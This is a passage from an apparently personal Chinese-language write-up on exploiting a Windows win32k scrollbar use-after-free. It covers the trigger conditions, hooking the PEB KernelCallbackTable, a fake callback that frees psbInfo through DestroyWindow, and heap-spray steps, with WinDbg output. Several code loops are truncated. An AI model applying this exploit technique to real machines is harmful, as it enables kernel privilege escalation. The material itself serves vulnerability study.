        +0x000 posMin           : Int4B
        +0x004 posMax           : Int4B
        +0x008 page             : Int4B
        +0x00c pos              : Int4B
    +0x014 Vert             : tagSBDATA
        +0x000 posMin           : Int4B
        +0x004 posMax           : Int4B
        +0x008 page             : Int4B
        +0x00c pos              : Int4B
接着, 你可以利用这几个结构体去查看上面的代码, 这里我直接给出结论.
    [+] 在xxxDrawScrollBar里面会触发某个函数回调, 用户可以控制这个函数回调. 定义这个函数回调为fakeCallBack
    [+] 在fakeCallBack里面, 我们使用DestoryWindow(hwndVulA), 使psbInfo内存块为free态
    [+] 使用堆喷技术可以篡改psbInfo的值
    [+] 在程序线段二处, 进行了一次异或运算. 假设(请调试验证):
        WSBflags 被我们篡改为2
        WArraow = 3
        ==> *psbInfo = iwArrows ? 4 * iwArrows | *psbInfo : *psbInfo & 0xFFFFFFF3;
        ==> WSBflags = 3 ? 4 * 3 | 2 : ...
                    = 0xe
    [+] 我们最后的目的利用的就是这个0xe, 怎么利用后面解释.
我们看一下过程.
我们得经过上面的这个程序才能实现完整的漏洞触发. 你可以进行逆向看下必须满足什么条件. 这里我给出结论.
    [+] 首先scrollbar的窗口是可见的, 设置WM_VISIBLE(这个地方我卡了很久才得出...)
    [+] scrollbar的窗口是子窗口. 即WS_CHILD
于是, 相关的源代码当中, 体现这两个细节的是.
    [+] CreateWinwodw(,....WS_VISIBLE,....) // 父窗口的创建.
    [+] hwndVulA = CreateWindowExA(0, "SCROLLBAR", NULL, WS_CHILD | SBS_HORZ | WS_HSCROLL | WS_VSCROLL, 10, 10, 100, 100, hwndPa, HMENU(NULL),              NULL, NULL);
        // 让其可见.
        ShowWindow(hwndVulA, SW_SHOW);
        UpdateWindow(hwndVulA);
So, 我们来实现控制回调函数.
### 回调的使用.
回调在我看来, 是内核漏洞发生的本源. 因为如果从`kernel mode`回到`user mode`, 再从user mode回到内核层次,
在用户层次的时候我们拥有着极大的自由. 这样的我们能够做太多事了.
SO: 如何利用回调.
### 利用回调.
我们假设, 在`xxxDrawScrollBar`里面会触发某个函数回调， 代码会去执行回调函数A, 如果我们能够HOOK回调函数A.
使其指向我们自己写的回调函数, 我们就能在此期间做一些坏坏的事. 关键的问题是, 这个回调函数A是谁呢?
### 确定回调函数A.
现在的我看来, 这是一个很简单的问题, 但是当时的我, 花了足够多的时间去解决和思考这个问题.
一开始的时候, 我选用的方法是: 静态阅读`xxxDrawScrollBar`的代码, 看下他当中有哪些回调函数, 确定哪些函数会被调用.
于是我祭出了我的IDA, 就一步一步的点啊之类的. 在经历了漫长的调试分析之后, 我失败了. 因为到后面的时候我的思绪乱了.
于是夜里三点, 躺在寝室的床上, 我开始思考人生, 真的要这样下去么, 一辈子就看着代码点点点度日子… 突然灵光一闪烁,
我意识到这样下去破日子不能这样子过下去. 于是我开始思考我掌握的和回调相关的知识. 定位到了关键性的几个信息.
#### Hook回调函数
首先看一条命令.
    kd> dt nt!_PEB @$peb
    [...]
        +0x058 KernelCallbackTable : 0x00007ff9`2107eb00 Void
    [...]
此处指向回调函数指针数组, 类似于这样:
    [+]  KernelCallbackTable = {0x3333333, 0x444444, 0x5555555};
接着查看回调函数必然经过这里:
    kd> u nt!KeUserModeCallback
        nt!KeUserModeCallback:
        fffff802`00675e10 4c894c2420      mov     qword ptr [rsp+20h],r9 ==> 稍后请在这里下断点
        fffff802`00675e15 4489442418      mov     dword ptr [rsp+18h],r8d
        fffff802`00675e1a 4889542410      mov     qword ptr [rsp+10h],rdx
        fffff802`00675e1f 894c2408        mov     dword ptr [rsp+8],ecx
        fffff802`00675e23 53              push    rbx
        fffff802`00675e24 56              push    rsi
        fffff802`00675e25 57              push    rdi
        fffff802`00675e26 4154            push    r12
该函数的原型如下:
    NTSTATUS KeUserModeCallback (
        IN  ULONG     ApiNumber, ==> rcx指向
        IN  PVOID     InputBuffer, ==> 传入的参数
        IN  ULONG     InputLength,
        OUT PVOID    *OutputBuffer,
        IN  PULONG    OutputLength
        );
其中, `APINumber`勾起了我的兴趣
    [+] 这里的 ApiNumber 是表示函数指针表（USER32!apfnDispatch）项的索引，在指定的进程中初始化 USER32.dll 期间该表的地址被拷贝到进程环境变量块（PEB.KernelCallbackTable）中。
期间, 我在一个win32k的paper上看到如上定义, 也就是说, 我只要能够确定`rcx`的值, 就能够确定我要hook的回调函数是谁.
首先, 在这两个地方下断点.
    kd> u fffff960`0025870e
    win32k!xxxEnableWndSBArrows+0x959e2:
    fffff960`0025870e e8bda7f6ff      call    win32k!xxxDrawScrollBar (fffff960`001c2ed0)    ==> 这里下
    fffff960`00258713 90              nop     ==> 这里下
此指令用于查看寄存器的值
    r rcx
在地点A和地点B之间会经过`nt!KeUserModeCallback`处, 我们查看rcx, 即可确定会调用哪些回调函数. 就是这么简单.
最后我选取了NCC group推荐的回调函数, 在确定了需要HOOK函数之后, 代码如下.
    getHookSaveFunctionAddr proc
    mov        rax, gs:[60h]    ; 指向PEB
    mov        rax, [rax+ 58h]    ; 指向KernelCallbackTable
    add        rax, 238h        ; API number * 8
    ret
    getHookSaveFunctionAddr endp
OK, 由此我们get到了需要HOOK的函数地址, 所以后面我们只要进行简单的相应的赋值语句就好了.
    [...]
    ptrHookedAddr = getHookSaveFunctionAddr();
    [...]
    *(ULONG_PTR *)ptrHookedAddr = (ULONG_PTR)fakedHookFunc;    
    [...]
Hook完毕, 让我们进行下一步. 在我们自己定义的fakeHookFunc之中, 我们能干些啥.
### fakedHookFunc(自定义回调函数实现UAF)
这一步, 我决定先给出相关的代码实现:
    VOID fakedHookFunc(VOID *)
    {
        CHAR Buf[0x1000];
        memset(Buf, 0, sizeof(Buf));
        if (hookedFlag == TRUE)
        {
            if (hookCount == 1)
            {
                hookedFlag = FALSE;
                //PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hwndVulA, 1);    //获取psbInfo对应的内核地址, 调试使用
                //__breakcode()    //调试使用.
                DestroyWindow(hwndVulA);    // 释放psbInfo
                for(int i = 0; i  dq fffff901`40ac5570-10
        fffff901`40ac5560  00000000`00000000 0c0055ff`699dfbd6 --> _HEAP_ENTRY
        fffff901`40ac5570  00000000`00000003 00000000`00000064 --> 这个地方存放psbInfo的结构
        fffff901`40ac5580  00000000`00000000 00000000`00000064
        fffff901`40ac5590  00000000`00000000  
接着我调用了下面一个`for`循环, 实现了堆喷. 覆盖数据如下所示:
    for(int i = 0; i  dq fffff901`40ac5570-10
        fffff901`40ac5560  00000000`00000000 080055ff`699dfbd6
        fffff901`40ac5570  00000002`00000002 bbbbaaaa`bbbbaaaa    --> 这个地方的2最后会变为0xe. 先不管
        fffff901`40ac5580  00000000`00000007 bbbbaaaa`bbbbaaaa